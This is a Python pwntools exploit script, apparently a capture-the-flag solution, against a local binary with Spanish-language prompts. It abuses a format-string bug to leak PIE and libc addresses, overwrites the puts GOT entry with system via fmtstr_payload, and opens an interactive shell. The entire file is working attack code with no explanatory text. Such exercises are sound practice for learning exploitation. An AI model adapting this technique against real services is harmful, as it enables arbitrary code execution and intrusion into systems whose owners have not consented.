from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./your-name_patched")
libc = ELF("./libc.so.6")

def start():
    if args.REMOTE:
        return remote("127.0.0.1", 1025)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

io.recvuntil(b"Introduce su alias:")
io.recvline()

io.sendline(b"/bin/sh\x00")

i = 3 # PIE Address

io.sendlineafter(b": ", b"2")
io.sendlineafter(b": ", f"%{i}$p".encode())
io.recvuntil("Tu nombre: ")

leak_address = int(io.recvline().strip().decode(), 16)

print(f"[+] Leak Address : {hex(leak_address)}")

elf.address = leak_address - 0x1224

i = 2 # Libc address of _IO_2_1_stdin_

io.sendlineafter(b": ", b"2")
io.sendlineafter(b": ", f"%{i}$p".encode())
io.recvuntil("Tu nombre: ")

leak_libc_address = int(io.recvline().strip().decode(), 16)

print(f"[+] Leak libc Address : {hex(leak_libc_address)}")
print(f"[+] _IO_2_1_stdin_: {hex(libc.sym._IO_2_1_stdin_)}")

libc.address = leak_libc_address - libc.sym._IO_2_1_stdin_

print(f"[+] System: {hex(libc.sym.system)}")

offset = 20

one_gadget = libc.address + 0xdeee3

print(f"[+] One Gadget: {hex(one_gadget)}")

writes_dict = {
    elf.got.puts: libc.sym.system
}

payload = fmtstr_payload(offset, writes_dict)

io.sendlineafter(b": ", b"2")
io.sendlineafter(b": ", payload)

io.sendlineafter(b": ", b"1")

io.interactive()
